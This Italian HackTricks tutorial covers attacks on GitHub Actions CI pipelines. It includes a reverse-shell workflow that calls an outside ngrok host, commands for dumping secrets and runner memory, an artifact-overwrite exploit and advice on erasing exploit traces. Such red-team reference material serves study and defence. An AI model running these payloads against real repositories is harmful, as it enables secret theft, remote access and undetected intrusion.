# Abuso di Github Actions

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di Github.

</details>

## Informazioni di Base

In questa pagina troverai:

* Un **riassunto di tutti gli impatti** di un attaccante che riesce ad accedere a un'azione di Github
* Diversi modi per **accedere a un'azione**:
* Avere **permessi** per creare l'azione
* Abusare dei trigger correlati alle **pull request**
* Abusare di **altre tecniche di accesso esterne**
* **Pivotare** da un repository gi√† compromesso
* Infine, una sezione sulle **tecniche di post-exploitation per abusare di un'azione dall'interno** (causare gli impatti menzionati)

## Riassunto degli Impatti

Per una introduzione su [**Github Actions controlla le informazioni di base**](../basic-github-information.md#github-actions).

Nel caso in cui tu possa **eseguire azioni Github arbitrarie/iniettare codice** in un **repository**, potresti essere in grado di:

* **Rubare** i **segreti** da quel repo/organizzazione.
* Se puoi solo iniettare, puoi rubare ci√≤ che √® gi√† presente nel workflow.
* Abusare dei **privilegi del repo** per accedere ad altre piattaforme come AWS e GCP.
* **Eseguire codice in worker personalizzati** (se vengono utilizzati worker personalizzati) e provare a pivotare da l√¨.
* **Sovrascrivere** il **codice del repository**.
* Questo dipende dai privilegi del `GITHUB_TOKEN` (se presenti).
* **Compromettere** **deployments** e altri **artefatti**.
* Se il codice sta effettuando il deploy o memorizzando qualcosa, potresti modificarlo e ottenere ulteriore accesso.

## GITHUB\_TOKEN

Questo "**segreto**" (proveniente da `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) viene fornito quando l'amministratore abilita questa opzione:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Questo token √® lo stesso che una **App Github utilizzer√†**, quindi pu√≤ accedere agli stessi endpoint: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github dovrebbe rilasciare un [**flusso**](https://github.com/github/roadmap/issues/74) che **consente l'accesso tra repository** all'interno di GitHub, in modo che un repo possa accedere ad altri repo interni utilizzando il `GITHUB_TOKEN`.
{% endhint %}

Puoi vedere i possibili **permessi** di questo token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Nota che il token **scade dopo che il lavoro √® stato completato**.\
Questi token assomigliano a questo: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Alcune cose interessanti che puoi fare con questo token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approva PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Crea PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Nota che in diverse occasioni potresti trovare **token dell'utente di GitHub all'interno delle variabili d'ambiente di GitHub Actions o nei secrets**. Questi token potrebbero conferirti maggiori privilegi sul repository e sull'organizzazione.
{% endhint %}

<details>

<summary>Elenco dei secrets nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni una shell inversa con segreti</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

√à possibile verificare i permessi concessi a un Token di Github nei repository di altri utenti **controllando i log** delle azioni:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Esecuzione Consentita

{% hint style="info" %}
Questo sarebbe il modo pi√π semplice per compromettere le azioni di Github, poich√© in questo caso si suppone che si abbia accesso per **creare un nuovo repository nell'organizzazione**, o si abbiano **privilegi di scrittura su un repository**.

Se ti trovi in questa situazione, puoi semplicemente controllare le [tecniche di post-sfruttamento](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Esecuzione dalla Creazione del Repository

Nel caso in cui i membri di un'organizzazione possano **creare nuovi repository** e tu possa eseguire azioni di github, puoi **creare un nuovo repository e rubare i segreti impostati a livello di organizzazione**.

### Esecuzione da un Nuovo Branch

Se puoi **creare un nuovo branch in un repository che contiene gi√† una Github Action** configurata, puoi **modificarla**, **caricare** il contenuto e quindi **eseguire quell'azione dal nuovo branch**. In questo modo puoi **esfiltrare i segreti a livello di repository e organizzazione** (ma devi sapere come sono chiamati).

Puoi rendere l'azione modificata eseguibile **manualmente**, quando viene creato un **PR** o quando viene **inviato del codice** (a seconda di quanto vuoi essere rumoroso):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Esecuzione Forked

{% hint style="info" %}
Ci sono diversi trigger che potrebbero consentire a un attaccante di **eseguire un'azione di Github di un altro repository**. Se queste azioni triggerabili sono configurate in modo non sicuro, un attaccante potrebbe essere in grado di comprometterle.
{% endhint %}

### `pull_request`

Il trigger del workflow **`pull_request`** eseguir√† il workflow ogni volta che viene ricevuta una pull request con alcune eccezioni: per impostazione predefinita, se √® la **prima volta** che si sta **collaborando**, qualche **manutentore** dovr√† **approvare** l'**esecuzione** del workflow:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Poich√© la **limitazione predefinita** √® per i **contribuenti di prima volta**, potresti contribuire **correggendo un bug/errore valido** e quindi inviare **altri PR per abusare dei tuoi nuovi privilegi di `pull_request`**.

**Ho testato questo e non funziona**: ~~Un'altra opzione sarebbe creare un account con il nome di qualcuno che ha contribuito al progetto e ha eliminato il suo account.~~
{% endhint %}

Inoltre, per impostazione predefinita **impedisce le autorizzazioni di scrittura** e **l'accesso ai segreti** al repository di destinazione come menzionato nella [**documentazione**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Ad eccezione di `GITHUB_TOKEN`, **i segreti non vengono passati al runner** quando un workflow viene attivato da un **repository forkato**. Il **`GITHUB_TOKEN` ha autorizzazioni di sola lettura** nelle pull request **da repository forkati**.

Un attaccante potrebbe modificare la definizione dell'azione di Github per eseguire cose arbitrarie e aggiungere azioni arbitrarie. Tuttavia, non sar√† in grado di rubare segreti o sovrascrivere il repository a causa delle limitazioni menzionate.

{% hint style="danger" %}
**S√¨, se l'attaccante cambia nella PR l'azione di Github che verr√† attivata, la sua Github Action sar√† quella utilizzata e non quella del repository di origine!**
{% endhint %}

Poich√© l'attaccante controlla anche il codice in esecuzione, anche se non ci sono segreti o autorizzazioni di scrittura sul `GITHUB_TOKEN`, un attaccante potrebbe ad esempio **caricare artefatti dannosi**.

### **`pull_request_target`**

Il trigger del workflow **`pull_request_target`** ha **autorizzazioni di scrittura** sul repository di destinazione e **accesso ai segreti** (e non richiede autorizzazione).

Si noti che il trigger del workflow **`pull_request_target`** **viene eseguito nel contesto base** e non in quello fornito dalla PR (per **non eseguire codice non attendibile**). Per ulteriori informazioni su `pull_request_target` [**controlla la documentazione**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Inoltre, per ulteriori informazioni su questo uso specifico pericoloso, controlla questo [**post sul blog di Github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Potrebbe sembrare che poich√© il **workflow eseguito** √® quello definito nel **base** e non nella PR, sia **sicuro** utilizzare **`pull_request_target`**, ma ci sono **alcuni casi in cui non lo √®**.

E questo avr√† **accesso ai segreti**.

### `workflow_run`

Il trigger [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) consente di eseguire un workflow diverso quando √® `completato`, `richiesto` o `in_corso`.

In questo esempio, un workflow √® configurato per essere eseguito dopo che il workflow separato "Esegui test" √® completato:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Inoltre, secondo i documenti: Il flusso di lavoro avviato dall'evento `workflow_run` √® in grado di **accedere a segreti e scrivere token, anche se il flusso di lavoro precedente non lo era**.

Questo tipo di flusso di lavoro potrebbe essere attaccato se **dipende** da un **flusso di lavoro** che pu√≤ essere **attivato** da un utente esterno tramite **`pull_request`** o **`pull_request_target`**. Un paio di esempi vulnerabili possono essere trovati in [**questo blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Il primo consiste nel flusso di lavoro attivato da `workflow_run` scaricare il codice degli attaccanti: `${{ github.event.pull_request.head.sha }}`\
Il secondo consiste nel **passare** un **artefatto** dal codice **non attendibile** al flusso di lavoro **`workflow_run`** e utilizzare il contenuto di questo artefatto in modo che diventi **vulnerabile all'esecuzione di codice remoto (RCE)**.

### `workflow_call`

TODO

TODO: Verificare se quando eseguito da un pull_request il codice usato/scaricato √® quello dell'originale o del pull request forkato

## Abuso dell'Esecuzione Forked

Abbiamo menzionato tutti i modi in cui un attaccante esterno potrebbe riuscire a far eseguire un flusso di lavoro di GitHub, ora vediamo come queste esecuzioni, se mal configurate, potrebbero essere abusate:

### Esecuzione del checkout non attendibile

Nel caso di **`pull_request`,** il flusso di lavoro verr√† eseguito nel **contesto del PR** (quindi eseguir√† il **codice malizioso dei PR**), ma qualcuno deve **autorizzarlo prima** e verr√† eseguito con alcune [limitazioni](./#pull\_request).

Nel caso di un flusso di lavoro che utilizza **`pull_request_target` o `workflow_run`** che dipende da un flusso di lavoro che pu√≤ essere attivato da **`pull_request_target` o `pull_request`** il codice del repository originale verr√† eseguito, quindi **l'attaccante non pu√≤ controllare il codice eseguito**.

{% hint style="danger" %}
Tuttavia, se l'**azione** ha un **checkout PR esplicito** che **prender√† il codice dal PR** (e non dalla base), utilizzer√† il codice controllato dagli attaccanti. Ad esempio (controlla la riga 12 dove il codice del PR viene scaricato):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NON SICURO. Fornito solo come esempio.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Il potenzialmente **codice non attendibile viene eseguito durante `npm install` o `npm build`** poich√© gli script di compilazione e i **pacchetti referenziati sono controllati dall'autore del PR**.

{% hint style="warning" %}
Un github dork per cercare azioni vulnerabili √®: `event.pull_request pull_request_target extension:yml` tuttavia, ci sono diversi modi per configurare i lavori in modo sicuro anche se l'azione √® configurata in modo non sicuro (come utilizzare condizioni su chi √® l'attore che genera il PR).
{% endhint %}

### Iniezioni di Script di Contesto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Nota che ci sono certi [**contesti di GitHub**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) i cui valori sono **controllati** dall'**utente** che crea il PR. Se l'azione di GitHub utilizza quei **dati per eseguire qualcosa**, potrebbe portare a **esecuzione di codice arbitrario:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Iniezione di Script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dai documenti: Puoi rendere una **variabile d'ambiente disponibile per i passaggi successivi** in un lavoro di flusso di lavoro definendo o aggiornando la variabile d'ambiente e scrivendo questo nel file di ambiente **`GITHUB_ENV`**.

Se un attaccante potesse **iniettare un qualsiasi valore** all'interno di questa **variabile env**, potrebbe iniettare variabili d'ambiente che potrebbero eseguire codice nei passaggi successivi come **LD\_PRELOAD** o **NODE\_OPTIONS**.

Ad esempio ([**questo**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [**questo**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), immagina un flusso di lavoro che si fida di un artefatto caricato per memorizzare il suo contenuto all'interno della variabile d'ambiente **`GITHUB_ENV`**. Un attaccante potrebbe caricare qualcosa del genere per comprometterlo:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Azioni di Terze Parti di GitHub Vulnerabili

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Come menzionato in [**questo post del blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), questa Azione di GitHub consente di accedere ad artefatti da diversi flussi di lavoro e persino da repository diversi.

Il problema √® che se il parametro **`path`** non √® impostato, l'artefatto viene estratto nella directory corrente e pu√≤ sovrascrivere file che potrebbero essere successivamente utilizzati o persino eseguiti nel flusso di lavoro. Pertanto, se l'Artifatto √® vulnerabile, un attaccante potrebbe sfruttarlo per compromettere altri flussi di lavoro che si fidano dell'Artifatto.

Esempio di flusso di lavoro vulnerabile:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Questo potrebbe essere attaccato con questo flusso di lavoro:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Altro Accesso Esterno

### Dirottamento del Repository dello Spazio dei Nomi Eliminato

Se un account cambia nome, un altro utente potrebbe registrare un account con lo stesso nome in seguito. Se un repository aveva **meno di 100 stelle prima del cambio di nome**, Github permetter√† al nuovo utente registrato con lo stesso nome di creare un **repository con lo stesso nome** di quello eliminato.

{% hint style="danger" %}
Quindi, se un'azione sta utilizzando un repository di un account inesistente, √® ancora possibile che un attaccante possa creare quell'account e compromettere l'azione.
{% endhint %}

Se altri repository stavano utilizzando **dipendenze da questi repository dell'utente**, un attaccante sar√† in grado di dirottarli. Qui trovi una spiegazione pi√π dettagliata: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivot del Repository

{% hint style="info" %}
In questa sezione parleremo delle tecniche che consentirebbero di **passare da un repository a un altro** supponendo di avere un qualche tipo di accesso al primo (controlla la sezione precedente).
{% endhint %}

### Avvelenamento della Cache

Una cache viene mantenuta tra **esecuzioni del flusso di lavoro nello stesso branch**. Ci√≤ significa che se un attaccante **compromette** un **pacchetto** che viene quindi memorizzato nella cache e **scaricato** ed eseguito da un flusso di lavoro **pi√π privilegiato**, sar√† in grado di **compromettere** anche quel flusso di lavoro.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Avvelenamento dell'Artifatto

I flussi di lavoro potrebbero utilizzare **artefatti da altri flussi di lavoro e persino da repository**, se un attaccante riesce a **compromettere** l'azione di Github che **carica un artefatto** che viene successivamente utilizzato da un altro flusso di lavoro, potrebbe **compromettere gli altri flussi di lavoro**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Sfruttamento da un'Azione

### Accesso ad AWS e GCP tramite OIDC

Controlla le seguenti pagine:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accesso a segreti <a href="#accessing-secrets" id="accessing-secrets"></a>

Se stai iniettando contenuti in uno script, √® interessante sapere come puoi accedere ai segreti:

* Se il segreto o il token √® impostato su una **variabile d'ambiente**, pu√≤ essere direttamente accessibile tramite l'ambiente utilizzando **`printenv`**.

<details>

<summary>Elenco dei segreti nell'output dell'Azione di Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni una shell inversa con segreti</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Se il segreto viene utilizzato **direttamente in un'espressione**, lo script shell generato viene memorizzato **su disco** ed √® accessibile.
* ```bash
cat /home/runner/work/_temp/*
```
* Per le azioni JavaScript i segreti vengono inviati tramite variabili d'ambiente
* ```bash
ps axe | grep node
```
* Per una **azione personalizzata**, il rischio pu√≤ variare a seconda di come un programma utilizza il segreto ottenuto dall'**argomento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuso dei runner self-hosted

Il modo per trovare quali **Github Actions vengono eseguite su infrastrutture non di Github** √® cercare **`runs-on: self-hosted`** nella configurazione yaml dell'azione Github.

I runner **self-hosted** potrebbero avere accesso a **informazioni extra sensibili**, ad altri **sistemi di rete** (punti terminali vulnerabili nella rete? servizio di metadati?) o, anche se √® isolato e distrutto, **pi√π di un'azione potrebbe essere eseguita contemporaneamente** e quella maliziosa potrebbe **rubare i segreti** dell'altra.

Nei runner self-hosted √® anche possibile ottenere i **segnreti dal processo \_Runner.Listener** che conterr√† tutti i segreti dei flussi di lavoro in qualsiasi momento, scaricando la sua memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Controlla [**questo post per ulteriori informazioni**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro immagini Docker di Github

√à possibile creare azioni Github che **creeranno e memorizzeranno un'immagine Docker all'interno di Github**.\
Un esempio pu√≤ essere trovato nel seguente riquadro espandibile:

<details>

<summary>Build e Push dell'Immagine Docker con Github Action</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Come hai potuto vedere nel codice precedente, il registro di Github √® ospitato in **`ghcr.io`**.

Un utente con permessi di lettura sul repository potr√† quindi scaricare l'immagine Docker utilizzando un token di accesso personale:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Quindi, l'utente potrebbe cercare **segnreti trapelati nei livelli dell'immagine Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informazioni sensibili nei log delle azioni di Github

Anche se **Github** cerca di **rilevare valori segreti** nei log delle azioni e **evitare di mostrarli**, **altri dati sensibili** che potrebbero essere generati nell'esecuzione dell'azione non saranno nascosti. Ad esempio, un JWT firmato con un valore segreto non sar√† nascosto a meno che non sia [configurato specificamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Coprire le tue tracce

(Tecnica da [**qui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prima di tutto, qualsiasi PR sollevata √® chiaramente visibile al pubblico su Github e all'account GitHub di destinazione. Su GitHub per impostazione predefinita, **non possiamo eliminare una PR da Internet**, ma c'√® un'alternativa. Per gli account Github che vengono **sospesi** da Github, tutte le loro **PR vengono automaticamente eliminate** e rimosse da Internet. Quindi, per nascondere la tua attivit√† devi o far sospendere il tuo **account GitHub o far flaggare il tuo account**. Questo **nasconderebbe tutte le tue attivit√†** su GitHub da Internet (praticamente rimuovere tutte le tue PR di exploit)

Un'organizzazione su GitHub √® molto attiva nel segnalare gli account a GitHub. Tutto ci√≤ che devi fare √® condividere "qualcosa" in un Problema e si assicureranno che il tuo account venga sospeso in 12 ore :p e cos√¨ hai reso il tuo exploit invisibile su github.

{% hint style="warning" %}
L'unico modo per un'organizzazione di capire di essere stata presa di mira √® controllare i log di GitHub da SIEM poich√© dall'interfaccia utente di GitHub la PR sarebbe rimossa.
{% endhint %}

## Strumenti

I seguenti strumenti sono utili per trovare i flussi di lavoro delle azioni di Github e persino trovarne di vulnerabili:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
